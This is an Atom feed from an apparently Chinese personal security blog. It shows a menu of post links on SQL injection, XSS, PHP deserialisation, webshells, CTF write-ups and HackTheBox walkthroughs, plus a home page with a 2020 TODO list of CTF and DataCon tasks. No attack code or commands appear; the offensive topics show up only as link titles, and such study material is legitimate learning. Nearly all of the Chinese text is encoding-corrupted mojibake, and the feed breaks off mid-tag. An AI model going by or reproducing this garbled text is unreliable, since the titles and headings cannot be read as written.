<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ca01h&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ca0y1h.top/"/>
  <updated>2020-09-28T06:06:55.375Z</updated>
  <id>http://ca0y1h.top/</id>
  
  <author>
    <name>ca01h</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>menu</title>
    <link href="http://ca0y1h.top/menu/"/>
    <id>http://ca0y1h.top/menu/</id>
    <published>2020-09-26T11:57:04.681Z</published>
    <updated>2020-09-28T06:06:55.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ç« å½’æ¡£"><a href="/archives/index.html"><strong>æ–‡ç« å½’æ¡£</strong></a></h1><h1 id="ç½®é¡¶æ–‡ç« "><strong>ç½®é¡¶æ–‡ç« </strong></h1><ul><li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li></ul><h1 id="Webå®‰å…¨"><strong>Webå®‰å…¨</strong></h1><h2 id="Webå®‰å…¨åŸºç¡€">Webå®‰å…¨åŸºç¡€</h2><ul><li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">åœ¨Ubuntu18.04å®‰è£…LNMP</a></li><li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQLæ•°æ®åº“åŸºæœ¬æ“ä½œ</a></li><li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™</a></li><li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">æ•°æ®åº“ç³»ç»ŸåŠŸèƒ½ç›¸å…³å­¦ä¹ </a></li><li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ </a></li><li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </a></li><li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">å„ç§æ³¨å…¥ç±»å‹çš„ç¯å¢ƒæ­å»ºå’Œä»£ç ç¼–å†™</a></li><li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labsæ‰‹å·¥æ³¨å…¥(ä¸€)</a></li><li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labsæ‰‹å·¥æ³¨å…¥(äºŒ)</a></li><li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMapå…¥é—¨å­¦ä¹ </a></li><li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQLæ³¨å…¥â€”â€”åŒæŸ¥è¯¢æ³¨å…¥</a></li><li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSSæ¼æ´å®æˆ˜å­¦ä¹ </a></li><li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRFæ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">é€»è¾‘æ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXEæ¼æ´åˆ©ç”¨</a></li><li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQLæ³¨å…¥ä¹‹MongoDB</a></li><li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQLæ³¨å…¥ä¸“é¡¹ä¹‹MySQLåŸºæœ¬æ³¨å…¥è¯­æ³•</a></li><li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</a></li></ul><h2 id="PHPç›¸å…³">PHPç›¸å…³</h2><ul><li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHPå›è°ƒåé—¨</a></li><li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHPååºåˆ—åŒ–â€”â€”åŸºç¡€ç¯‡</a></li><li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHPååºåˆ—åŒ–â€”â€”Phar</a></li><li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHPååºåˆ—åŒ–â€”â€”Session</a></li><li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHPååºåˆ—åŒ–-åŸç”Ÿç±»åˆ©ç”¨</a></li><li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHPæ— æ•°å­—å­—æ¯æ„é€ webshell</a></li><li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨</a></li><li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLFåˆ©ç”¨</a></li><li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li></ul><h2 id="Writeups">Writeups</h2><ul><li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li><li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTFâ€”PHPä»£å®¡</a></li><li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTFâ€”PHPæ¡†æ¶æ¼æ´</a></li><li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTFâ€”PHPååºåˆ—åŒ–</a></li><li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTFâ€”SQLæ³¨å…¥</a></li><li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTFâ€”XSS</a></li><li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTFâ€”SSRF</a></li><li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTFâ€”å‘½ä»¤æ‰§è¡Œ</a></li><li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTFâ€”æ–‡ä»¶ä¸Šä¼ </a></li><li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTFâ€”æ–‡ä»¶åŒ…å«</a></li><li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTFâ€”Python</a></li><li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTFâ€”NodeJS</a></li><li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTFâ€”Rubyå’ŒGo</a></li><li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTFâ€”æ¸—é€æµ‹è¯•</a></li><li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020ç”µä¿¡å¤©ç¿¼æ¯CTFâ€”APITest</a></li><li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">æ˜Ÿç›Ÿ6æœˆAWD Web+Pwn</a></li><li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020ä¸ƒæœˆèµ› Web</a></li><li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li><li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020ç¬¬äº”ç©ºé—´CTF Web</a></li><li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">é¦–å±Šé’“é±¼åŸæ¯CTF</a></li><li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTFå…«æœˆèµ›</a></li></ul><h1 id="é¶æœºç³»åˆ—"><strong>é¶æœºç³»åˆ—</strong></h1><h2 id="HackTheBox">HackTheBox</h2><ul><li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li><li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li><li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li><li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li><li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li><li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li><li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li><li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li><li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li><li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li><li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li><li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li><li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li><li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li><li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li><li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li><li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li><li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li></ul><h2 id="VulnHub">VulnHub</h2><ul><li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li><li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li><li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li></ul><h1 id="ä»£ç å®¡è®¡"><strong>ä»£ç å®¡è®¡</strong></h1><h2 id="PHPä»£ç å®¡è®¡">PHPä»£ç å®¡è®¡</h2><ul><li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day1</a></li><li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day2</a></li><li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day3</a></li><li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day4</a></li><li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHPä»£ç å®¡è®¡å­¦ä¹ â€”Day5</a></li><li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHPä»£ç å®¡è®¡å¤ç°â€”yixuncms</a></li><li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHPä»£ç å®¡è®¡å¤ç°â€”chinaz</a></li></ul><h1 id="æµé‡åˆ†æ"><strong>æµé‡åˆ†æ</strong></h1><ul><li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li><li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li><li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Broè¯­æ³•å­¦ä¹ ä¹‹åŸºç¡€çŸ¥è¯†</a></li></ul><h1 id="æœºå™¨å­¦ä¹ "><strong>æœºå™¨å­¦ä¹ </strong></h1><h2 id="åŸºç¡€å­¦ä¹ ">åŸºç¡€å­¦ä¹ </h2><ul><li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li><li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li><li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li><li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰</a></li></ul><h1 id="Python"><strong>Python</strong></h1><h2 id="Pythonç¼–ç¨‹">Pythonç¼–ç¨‹</h2><ul><li><p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Pythonå‡½æ•°çš„å‚æ•°</a></p></li><li><p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°</a></p></li><li><p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…</a></p></li><li><p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨</a></p></li><li><p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿</a></p></li><li><p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIOç¼–ç¨‹</a></p></li></ul><h1 id="Java"><strong>Java</strong></h1><h2 id="Javaç¼–ç¨‹">Javaç¼–ç¨‹</h2><ul><li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">JavaåŸºç¡€å­¦ä¹ ä¹‹JDKã€JREã€JVM</a></li><li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">JavaåŸºç¡€å­¦ä¹ ä¹‹æ ¸å¿ƒç±»</a></li><li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€</a></li><li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">JavaåŸºç¡€å­¦ä¹ ä¹‹å¼‚å¸¸å¤„ç†</a></li></ul><h1 id="ç®—æ³•"><strong>ç®—æ³•</strong></h1><h2 id="Leetcode">Leetcode</h2><ul><li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li></ul><h1 id="éšç¬”"><strong>éšç¬”</strong></h1><h2 id="ç»éªŒ">ç»éªŒ</h2><ul><li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">ä»0åˆ°100åˆ†çš„è·¯ç¨‹â€”â€”å†™åœ¨2019å¹´çš„æœ€åä¸€å¤©</a></li></ul><h2 id="æŠ€æœ¯">æŠ€æœ¯</h2><ul><li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">é˜¿é‡Œäº‘Centos7-Ngnixéƒ¨ç½²Hexo</a></li><li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">é˜¿é‡Œäº‘OSS-PicGoæ­å»ºMarkdownå›¾åºŠ</a></li><li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼</a></li><li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li><li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ–‡ç« å½’æ¡£&quot;&gt;&lt;a href=&quot;/archives/index.html&quot;&gt;&lt;strong&gt;æ–‡ç« å½’æ¡£&lt;/strong&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h1 id=&quot;ç½®é¡¶æ–‡ç« &quot;&gt;&lt;strong&gt;ç½®é¡¶æ–‡ç« &lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/Othe
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ca01hã®ç¬”è®°æœ¬</title>
    <link href="http://ca0y1h.top/home/"/>
    <id>http://ca0y1h.top/home/</id>
    <published>2020-09-26T11:57:04.671Z</published>
    <updated>2020-09-28T06:11:09.701Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>ca01h@æ˜Ÿç›Ÿå®‰å…¨</strong></p><p>NTExOTY1NzM4QHFxLmNvbQ==</p></blockquote><p>äº’è”ç½‘æ—¶ä»£çš„çŸ¥è¯†æ˜¯é›¶æ•£çš„ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå†™å­—çš„åœ°æ–¹ï¼ŒæŠŠé›¶æ•£çš„çŸ¥è¯†æ±‡èšèµ·æ¥ï¼Œä»¥ç‚¹è¿çº¿ï¼Œä»¥çº¿èšé¢ï¼Œä¸€æ–¹é¢èƒ½å½¢æˆä¸€ä¸ªå®Œæ•´çš„çŸ¥è¯†ä½“ç³»ï¼Œå¦ä¸€æ–¹é¢è‡ªå·±æ‰€éœ€ä¹‹æ—¶æ–¹ä¾¿æŸ¥é˜…ï¼Œäºæ˜¯ä¹å°±è¯ç”Ÿäº†<strong>ca01hã®ç¬”è®°æœ¬</strong>ã€‚</p><h2 id="TODO-LIST">TODO LIST</h2><h3 id="2020">2020</h3><p><strong>ã€æœªå®Œæˆã€‘SCTFå¤ç›˜ï¼š<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p><p><strong>ã€æœªå®Œæˆã€‘<a href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p><h4 id="September">September</h4><ul><li><s><strong>ã€å·²å®Œæˆã€‘å®ä¹ +HW</strong></s></li><li><strong>ã€æœªå®Œæˆã€‘DataConå¤ç›˜</strong></li><li><s><strong>ã€å·²å®Œæˆã€‘2020å·…å³°æå®¢CTF</strong></s></li></ul><h4 id="August">August</h4><ul><li><s><strong>ã€å·²å®Œæˆã€‘XCTFâ€”â€”WMCTF</strong>ï¼ˆæœ‰å¹¸åšäº†ä¸€ä¸ªç­¾åˆ°é¢˜</s></li><li><s><strong>ã€å·²å®Œæˆã€‘DataCon2020 DNSæ¶æ„æµé‡åˆ†æ</strong>ï¼ˆæœ‰å¹¸æ··äº†ä¸€ä¸ªé¼“åŠ±å¥–</s><ul><li>DNSæ¶æ„åŸŸååˆ†æ<ul><li><a href="https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg">https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg</a></li></ul></li><li>åŠ å¯†æ¶æ„æµé‡æ£€æµ‹<ul><li>åˆèµ›ï¼š<a href="https://s1mple.online/2020/08/09/DataCon2020-%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%88%9D%E8%B5%9B-Writeup-%E5%8F%8A%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D/">https://s1mple.online/2020/08/09/DataCon2020-åŠ å¯†æ¶æ„æµé‡æ£€æµ‹åˆèµ›-Writeup-åŠæ€»ç»“åæ€/</a></li></ul></li><li>åƒµå°¸ç½‘ç»œåˆ†æ<ul><li>ç¬¬ä¸€é¢˜ï¼š<a href="https://www.cdxy.me/?p=829">https://www.cdxy.me/?p=829</a></li><li>ç¬¬ä¸‰é¢˜ï¼š<a href="https://zhuanlan.zhihu.com/p/186948840">https://zhuanlan.zhihu.com/p/186948840</a></li></ul></li><li>ç½‘ç»œé»‘äº§åˆ†æ</li><li>æ¶æ„ä»£ç åˆ†æ<ul><li><a href="https://github.com/yuriufo/DataCon2020">https://github.com/yuriufo/DataCon2020</a></li><li><a href="https://zhuanlan.zhihu.com/p/187535672">https://zhuanlan.zhihu.com/p/187535672</a></li><li><a 